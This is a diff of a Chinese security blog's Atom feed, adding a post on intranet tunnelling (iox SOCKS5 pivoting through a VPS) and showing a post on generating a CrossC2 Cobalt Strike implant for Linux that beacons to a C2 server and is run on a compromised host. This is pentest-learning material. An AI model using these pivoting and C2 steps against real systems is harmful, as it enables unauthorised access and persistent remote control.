@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-12-20T13:45:18.121Z</updated>
+  <updated>2023-12-22T12:30:15.127Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -17,11 +17,32 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>内网穿透及隧道搭建技术</title>
+    <link href="http://example.com/posts/1154042679.html"/>
+    <id>http://example.com/posts/1154042679.html</id>
+    <published>2023-12-22T12:07:23.000Z</published>
+    <updated>2023-12-22T12:30:15.127Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="内网连通性判断"><a href="#内网连通性判断" class="headerlink" title="内网连通性判断"></a>内网连通性判断</h1><p>ICMP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping ip</span><br></pre></td></tr></table></figure><p>TCP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -zv ip</span><br><span class="line">telnet ip port</span><br><span class="line">curl -vv telnet://&lt;ip:port&gt;</span><br></pre></td></tr></table></figure><p>HTTP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -vv &lt;ip:port&gt;</span><br></pre></td></tr></table></figure><p>DNS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup &lt;domain&gt; &lt;dns&gt;</span><br></pre></td></tr></table></figure><h1 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h1><h2 id="NPS"><a href="#NPS" class="headerlink" title="NPS"></a>NPS</h2><p><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p><h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><h2 id="Venom-star"><a href="#Venom-star" class="headerlink" title="Venom :star:"></a>Venom :star:</h2><p><a href="https://github.com/Dliv3/Venom">https://github.com/Dliv3/Venom</a></p><p>感觉这个项目挺好的，可惜不知道为什么Ubuntu版本跑不起。如果光是Win或者CentOS还是挺好用</p><h2 id="IOX​-​-star"><a href="#IOX​-​-star" class="headerlink" title="IOX​ ​ :star:"></a>IOX​ ​ :star:</h2><p><a href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a></p><p>比EW和LCX好用</p><h3 id="建立Socks5方法"><a href="#建立Socks5方法" class="headerlink" title="建立Socks5方法"></a>建立Socks5方法</h3><p>配合proxychains和proxifier使用</p><ul><li><code>上线机器</code>开启Socks5的监听</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iox proxy -l 8888</span><br></pre></td></tr></table></figure><ul><li><code>VPS</code>开启监听转发流量9999&#x3D;&gt;8888</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iox proxy -l 9999 -l 8888</span><br></pre></td></tr></table></figure><ul><li><code>上线机器</code>执行转发</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iox proxy -r &lt;vps-ip&gt;:9999</span><br></pre></td></tr></table></figure><ul><li>Socks5代理地址</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;vps-ip&gt;:8888</span><br></pre></td></tr></table></figure><h1 id="网络层隧道"><a href="#网络层隧道" class="headerlink" title="网络层隧道"></a>网络层隧道</h1><h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><h1 id="传输层隧道"><a href="#传输层隧道" class="headerlink" title="传输层隧道"></a>传输层隧道</h1><h1 id="应用层隧道"><a href="#应用层隧道" class="headerlink" title="应用层隧道"></a>应用层隧道</h1><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><h2 id="HTTP-HTTPS"><a href="#HTTP-HTTPS" class="headerlink" title="HTTP&#x2F;HTTPS"></a>HTTP&#x2F;HTTPS</h2><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2>]]></content>
+    
+    
+    <summary type="html">内网穿透及隧道搭建技术</summary>
+    
+    
+    
+    <category term="web" scheme="http://example.com/category/web/"/>
+    
+    
+    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
     <title>利用CrossC2插件Linux上线CS</title>
-    <link href="http://example.com/posts/3584873491/"/>
-    <id>http://example.com/posts/3584873491/</id>
+    <link href="http://example.com/posts/3584873491.html"/>
+    <id>http://example.com/posts/3584873491.html</id>
     <published>2023-12-20T10:30:08.000Z</published>
-    <updated>2023-12-20T13:45:18.121Z</updated>
+    <updated>2023-12-20T13:45:36.620Z</updated>
     
     <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>利用CrossC2插件解决Linux无法上线CobaltStrike</p><p><strong>插件地址</strong></p><p><a href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="下载需要的CNA以及CS客户端类型"><a href="#下载需要的CNA以及CS客户端类型" class="headerlink" title="下载需要的CNA以及CS客户端类型"></a>下载需要的CNA以及CS客户端类型</h3><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220184818465.png" alt="image-20231220184818465"></p><h3 id="配置CNA文件"><a href="#配置CNA文件" class="headerlink" title="配置CNA文件"></a>配置CNA文件</h3><p>$CC2_PATH是插件的绝对路径</p><p>$CC2_BIN 是配置客户端类型</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220184956818.png" alt="image-20231220184956818"></p><p>根据路径修改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$CC2_PATH = &quot;D:\\TPA\\CS CNA\\CrossC2\\&quot;; # &lt;-------- fix</span><br><span class="line">$CC2_BIN = &quot;genCrossC2.exe&quot;;</span><br></pre></td></tr></table></figure><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220192032101.png" alt="image-20231220192032101"></p><h3 id="下载服务端"><a href="#下载服务端" class="headerlink" title="下载服务端"></a>下载服务端</h3><p>下载teamserver下的<code>.cobaltstrike.beacon_keys</code>文件到本地</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220195812077.png" alt="image-20231220195812077"></p><h3 id="创建CrossC2-Listener"><a href="#创建CrossC2-Listener" class="headerlink" title="创建CrossC2 Listener"></a>创建CrossC2 Listener</h3><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220195705966.png" alt="image-20231220195705966"></p><p>进行响应配置</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220200043925.png" alt="image-20231220200043925"></p><p>点击build，看Log执行了成功生成了<code>t_c22.out</code>和<code>t_c22.out.lib</code></p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220200143248.png" alt="image-20231220200143248"></p><p>在CS的客户端目录进行查看</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220200348667.png" alt="image-20231220200348667"></p><h3 id="上线Linux机器"><a href="#上线Linux机器" class="headerlink" title="上线Linux机器"></a>上线Linux机器</h3><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220212746796.png" alt="image-20231220212746796"></p><p>选择C2的监听器，之后执行curl命令</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220212847752.png" alt="image-20231220212847752"></p><p>到这里来说应该上线了，但是没有很看了很多资料文章无法解决，到这里采用第二种方式不用GUI插件了（还是命令好使）</p><h3 id="命令生成上线"><a href="#命令生成上线" class="headerlink" title="命令生成上线"></a>命令生成上线</h3><p>首先建一个HTTPS的监听器，必须是HTTPS</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220213151371.png" alt="image-20231220213151371"></p><p>将服务器的<code>.cobaltstrike.beacon_keys</code>文件放在与下载的genCrossC2.Linux在同一目录下，我直接将genCrossC2.Linux放在了Teamserver的目录下（也可以指定）</p><p>给执行权限然后执行命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./genCrossC2.Linux 192.168.157.201 443 null null Linux x64 <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220213530621.png" alt="image-20231220213530621"></p><p>上传到getshell的机器执行test文件，成功上线Linux机器</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220213705374.png" alt="image-20231220213705374"></p>]]></content>
     
@@ -39,8 +60,8 @@
   
   <entry>
     <title>Docker逃逸漏洞复现（CVE-2019-5736）</title>
-    <link href="http://example.com/posts/11133913/"/>
-    <id>http://example.com/posts/11133913/</id>
+    <link href="http://example.com/posts/11133913.html"/>
+    <id>http://example.com/posts/11133913.html</id>
     <published>2023-12-20T07:40:08.000Z</published>
     <updated>2023-12-20T10:07:33.308Z</updated>
     
@@ -60,8 +81,8 @@
   
   <entry>
     <title>HTTP请求走私HRS攻击</title>
-    <link href="http://example.com/posts/3240233657/"/>
-    <id>http://example.com/posts/3240233657/</id>
+    <link href="http://example.com/posts/3240233657.html"/>
+    <id>http://example.com/posts/3240233657.html</id>
     <published>2023-12-16T06:39:24.000Z</published>
     <updated>2023-12-20T10:07:33.307Z</updated>
     
@@ -81,8 +102,8 @@
   
   <entry>
     <title>Burpsuit指纹识别及反制绕过</title>
-    <link href="http://example.com/posts/4207397671/"/>
-    <id>http://example.com/posts/4207397671/</id>
+    <link href="http://example.com/posts/4207397671.html"/>
+    <id>http://example.com/posts/4207397671.html</id>
     <published>2023-12-14T15:30:55.000Z</published>
     <updated>2023-12-20T10:07:33.306Z</updated>
     
@@ -102,8 +123,8 @@
   
   <entry>
     <title>Kali Linux网卡配置问题解决</title>
-    <link href="http://example.com/posts/1283819788/"/>
-    <id>http://example.com/posts/1283819788/</id>
+    <link href="http://example.com/posts/1283819788.html"/>
+    <id>http://example.com/posts/1283819788.html</id>
     <published>2023-12-14T01:30:48.000Z</published>
     <updated>2023-12-14T08:06:20.945Z</updated>
     
@@ -123,8 +144,8 @@
   
   <entry>
     <title>RSA密钥生成和SSH自动登录远程服务器</title>
-    <link href="http://example.com/posts/1324925222/"/>
-    <id>http://example.com/posts/1324925222/</id>
+    <link href="http://example.com/posts/1324925222.html"/>
+    <id>http://example.com/posts/1324925222.html</id>
     <published>2023-12-13T02:10:24.000Z</published>
     <updated>2023-12-13T02:34:38.048Z</updated>
     
@@ -144,10 +165,10 @@
   
   <entry>
     <title>验证码的识别与爆破</title>
-    <link href="http://example.com/posts/2884547573/"/>
-    <id>http://example.com/posts/2884547573/</id>
+    <link href="http://example.com/posts/2884547573.html"/>
+    <id>http://example.com/posts/2884547573.html</id>
     <published>2023-12-11T12:14:21.000Z</published>
-    <updated>2023-12-13T15:37:32.053Z</updated>
+    <updated>2023-12-22T11:59:13.256Z</updated>
     
     <content type="html"><![CDATA[<p>在遇到输入登录框</p>]]></content>
     
@@ -159,14 +180,14 @@
     <category term="web" scheme="http://example.com/category/web/"/>
     
     
-    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    <category term="Web安全" scheme="http://example.com/tag/Web%E5%AE%89%E5%85%A8/"/>
     
   </entry>
   
   <entry>
     <title>Chrome插件SwitchyOmega本地不代理解决</title>
-    <link href="http://example.com/posts/2657481293/"/>
-    <id>http://example.com/posts/2657481293/</id>
+    <link href="http://example.com/posts/2657481293.html"/>
+    <id>http://example.com/posts/2657481293.html</id>
     <published>2023-12-11T12:06:35.000Z</published>
     <updated>2023-12-11T12:11:38.276Z</updated>
     
@@ -186,8 +207,8 @@
   
   <entry>
     <title>vulnhub darkhole1 靶场通关</title>
-    <link href="http://example.com/posts/452430507/"/>
-    <id>http://example.com/posts/452430507/</id>
+    <link href="http://example.com/posts/452430507.html"/>
+    <id>http://example.com/posts/452430507.html</id>
     <published>2023-11-24T07:10:23.000Z</published>
     <updated>2023-11-24T07:19:31.788Z</updated>
     
